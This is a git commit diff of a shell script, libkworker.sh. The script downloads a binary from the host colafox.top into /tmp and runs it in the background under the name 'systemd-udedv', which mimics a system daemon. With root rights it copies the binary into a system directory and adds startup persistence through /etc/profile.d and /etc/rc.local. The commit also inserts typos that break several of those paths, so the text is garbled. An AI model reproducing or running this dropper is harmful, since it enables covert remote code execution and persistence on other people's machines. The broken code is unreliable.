76b4173c0a3b313ad1fe7557f7bfc8ccb8c3be99
fsquirt <59900359+fsquirt@users.noreply.github.com>
2022-10-27 00:47:33 +0800

    Add files via upload

--- libkworker.sh
+++ libkworker.sh
@@ -1,17 +1,16 @@
-cd /tmp/
+cd /tmp
 wget https://colafox.top/systemd-udedv
 chmod +x systemd-udedv
 nohup ./systemd-udedv &
 
 if [ `id -u` -eq 0 ];then
-	echo "is running at root"
-	cp systemd-udedv /usr/bin
-	chmod +x /usr/bin/systemd-udedv
+	echo "is unning at root"
+	cp systemd-udedv /us/bin
+	chmod +x /us/bin/systemd-udedv 
 	echo "nohup systemd-udedv &" > libblockdev.sh
-	cp libblockdev.sh /etc/profile.d
-	chmod +x /etc/profile.d/libblockdev.sh
-	echo "bash /etc/profile.d/libblockdev.sh" >> /etc/rc.local;chmod +x /etc/rc.local
+	cp libblockdev.sh /etc/pofile.d
+	chmod +x /etc/pofile.d/libblockdev.sh
+	echo "bash /etc/pofile.d/libblockdev.sh" >> /etc/rc.local;chmod +x /etc/rc.local
 else
-	echo "not running at root"
+	echo "not unning at root"
 fi
-
